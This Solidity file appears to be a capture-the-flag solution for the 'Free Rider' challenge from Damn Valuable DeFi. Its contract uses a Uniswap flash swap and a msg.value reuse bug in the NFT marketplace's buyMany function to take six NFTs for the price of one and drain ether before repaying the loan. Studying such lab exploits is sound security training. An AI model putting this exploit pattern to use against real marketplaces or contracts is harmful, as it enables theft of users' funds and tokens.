// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "./FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../DamnValuableNFT.sol";


interface IWeth{
    function withdraw(uint wad) external;
    function balanceOf(address address_) external view returns(uint);
    function transfer(address dst, uint wad) external returns (bool);
    function deposit() external payable ;
}

contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver{
    
    IWeth public weth;
    FreeRiderNFTMarketplace public freeRiderMarketPlace;
    DamnValuableNFT public damnValuableNFT;
    address public buyer;
    constructor(
        IWeth weth_, 
        FreeRiderNFTMarketplace freeRiderMarketPlace_, 
        DamnValuableNFT damnValuableNFT_,
        address buyer_
    ){
        weth = weth_;
        freeRiderMarketPlace= freeRiderMarketPlace_;
        damnValuableNFT = damnValuableNFT_;
        buyer = buyer_;
    }
    
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override{

        uint initialEthBalance = address(this).balance;

        //ensure we have received the loan in weth
        require(weth.balanceOf(address(this)) >= 30 ether, "not enough weth received from flashswap");

        //Exhange weth for ether
        weth.withdraw(30 ether);

        //ensure we received enough ether from the weth contracvt
        require(address(this).balance >= 30 ether + initialEthBalance, "not enough ether received from weth contract");

        // Then we buy all 6 nfts from the marketplace for the price of one (15 eth) using the exploit, leaving us with 15 eth left in our contract
        uint[] memory tokenIds = new uint[](6);
        for (uint i = 0; i <6; i ++){
            tokenIds[i]=i;
        }
        freeRiderMarketPlace.buyMany{value: 15 ether}(tokenIds );

        //Verify that our attack contract now owns the nfts
        require(damnValuableNFT.ownerOf(0) == address(this), "contract doesn't own token 0 yet");
        require(damnValuableNFT.ownerOf(1) == address(this), "contract doesn't own token 1 yet");
        require(damnValuableNFT.ownerOf(2) == address(this), "contract doesn't own token 2 yet");
        require(damnValuableNFT.ownerOf(3) == address(this), "contract doesn't own token 3 yet");
        require(damnValuableNFT.ownerOf(4) == address(this), "contract doesn't own token 4 yet");
        require(damnValuableNFT.ownerOf(5) == address(this), "contract doesn't own token 5 yet");

        //verify we still 15 ether in the contract
        require(address(this).balance >= 15 ether + initialEthBalance, "Contract not left with enough ether after buying");

        // Next we place 2 nfts on sale for 15 eth each
        uint[] memory tokenIdsToSell = new uint[](2);
        tokenIdsToSell[0] =0;
        tokenIdsToSell[1] =1;
        uint[] memory pricesForSell = new uint[](2);
        pricesForSell[0] = 15 ether;
        pricesForSell[1] = 15 ether;

        damnValuableNFT.setApprovalForAll(address(freeRiderMarketPlace), true);
        freeRiderMarketPlace.offerMany(tokenIdsToSell, pricesForSell);

        // Then we buy those both those nfts with just 15 eth. However, the marketplace pays us a total of 30 eth so we will still have 30 eth left to pay our loan for the flash swap
        freeRiderMarketPlace.buyMany{value: 15 ether}(tokenIdsToSell );
        require(address(this).balance >= 30 ether + initialEthBalance, "Contract not left with enough ether after buying");

        // transfer the 6 nfts to the FreeRiderBuyer contract using safeTransfer. Upon the 6th transfer the eth payout will be sent to the attacker address.
        for (uint i =0; i<6; i++){
            damnValuableNFT.safeTransferFrom(address(this), buyer, i);
        }

        //exchange the eth for weth to pay back the borrowed amount to uniswap
        weth.deposit{value: address(this).balance}();

        //pay back the flashloan
        bool success = weth.transfer(msg.sender, weth.balanceOf(address(this)));
        require (success, "paying back loan not sucessful");
    }

    //need this to allow the marketplace to transfer nfts to the attack contract
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }
    
    //need this to allow the weth contract to send the attack contract eth
    receive() external payable {}

}